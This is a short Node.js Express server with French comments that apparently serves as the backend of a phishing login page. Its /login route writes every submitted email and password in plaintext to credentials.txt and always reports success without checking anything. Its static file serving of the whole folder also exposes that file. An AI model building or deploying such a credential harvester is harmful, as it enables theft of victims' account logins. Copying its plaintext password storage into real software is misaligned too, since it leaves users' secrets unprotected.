const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware pour traiter les données JSON
app.use(express.json());
app.use(express.static('.'));

// Route pour la page principale
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Route pour traiter les données du formulaire
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    
    // Enregistrer les données dans un fichier
    const data = `Email: ${email}, Password: ${password}\n`;
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Erreur lors de l\'enregistrement des données:', err);
        }
    });
    
    // Répondre au client
    res.json({ success: true });
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});